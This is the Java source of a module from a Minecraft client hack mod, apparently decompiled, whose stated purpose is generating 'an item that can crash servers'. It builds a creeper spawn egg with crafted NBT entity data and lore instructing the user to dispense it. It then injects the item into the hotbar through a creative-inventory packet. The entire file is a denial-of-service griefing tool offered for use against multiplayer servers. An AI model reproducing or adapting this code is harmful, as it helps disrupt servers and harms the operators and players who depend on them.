package net.zebra.quiverone.modules.crash;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.class_1792;
import net.minecraft.class_1799;
import net.minecraft.class_2378;
import net.minecraft.class_2487;
import net.minecraft.class_2522;
import net.minecraft.class_2873;
import net.minecraft.class_2960;
import net.zebra.quiverone.modules.Category;
import net.zebra.quiverone.modules.Module;

public class SpawnEgg extends Module {
   public SpawnEgg() {
      super("SpawnEgg", "Generates an item that can crash servers", Category.CRASH, -1, false, true);
   }

   public void onEnable() {
      if (!mc.field_1724.field_7503.field_7477) {
         sendMessage("Creative mode only");
         this.disable();
      } else {
         class_1792 item = (class_1792)class_2378.field_11142.method_10223(new class_2960("creeper_spawn_egg"));
         class_1799 stack = new class_1799(item, 1);
         stack.method_7980(this.createNBT());
         this.placeStackInHotbar(stack);
         this.disable();
      }
   }

   private class_2487 createNBT() {
      try {
         return class_2522.method_10718("{display:{Lore:['\"§r1. Place item in dispenser.\"','\"§r2. Dispense item.\"','\"§r3. Ssss... BOOM!\"'],Name:'{\"text\":\"§rServer Creeper\"}'},EntityTag:{CustomName:\"TEST\",id:\"Creeper\",CustomNameVisible:1}}");
      } catch (CommandSyntaxException var2) {
         throw new RuntimeException(var2);
      }
   }

   private void placeStackInHotbar(class_1799 stack) {
      for(int i = 0; i < 9; ++i) {
         if (mc.field_1724.field_7514.method_5438(i).method_7960()) {
            mc.field_1724.field_3944.method_2883(new class_2873(36 + i, stack));
            sendMessage("Item created");
            return;
         }
      }

      sendMessage("Please clear a slot in your hotbar");
   }
}
